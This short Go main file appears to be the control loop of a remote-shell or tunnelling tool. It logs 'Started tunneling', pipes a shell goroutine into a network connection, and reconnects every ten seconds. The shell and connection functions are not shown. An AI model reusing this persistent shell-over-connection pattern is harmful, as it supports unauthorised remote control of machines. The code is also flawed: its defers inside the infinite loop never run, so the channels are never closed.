package main

import (
	"log"
	"time"
	_"fmt"
)

const (
	MAX_TRANSFR = 4096
)

func main(){
	log.Println("Started tunneling")
	
	i:=1
	for {
		log.Println("re-running software for the", i, "time")
		out := make(chan []byte, MAX_TRANSFR)
		in := make(chan []byte, MAX_TRANSFR)
		defer close(out)
		defer close(in)

		go StartShell(out, in)


		StartConnection(out, in)
		i++
		time.Sleep(time.Second * 10)
	}
}